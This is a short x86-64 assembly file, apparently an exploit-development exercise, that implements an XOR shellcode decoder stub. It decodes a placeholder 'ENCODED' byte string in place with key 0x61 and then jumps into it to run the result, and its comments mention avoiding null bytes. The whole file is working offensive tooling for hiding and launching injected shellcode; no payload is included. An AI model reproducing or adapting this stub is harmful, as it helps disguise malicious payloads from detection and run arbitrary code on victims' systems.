global _start

section .text
_start:
    jmp     decoder
    
encoded:
    db      ENCODED                ; position important to evade null bytes

decoder:
    xor     rsi, rsi
    lea     rdi, [rel encoded]     ; this comes after data for "negative" rel
decode:
    mov     al, [rdi+rsi]
    cmp     al, 0xff               ; end byte
    je      exec
    xor     al, 0x61               ; key
    mov     [rdi+rsi], al
    inc     rsi
    jmp     decode
    
exec:
    jmp     rdi

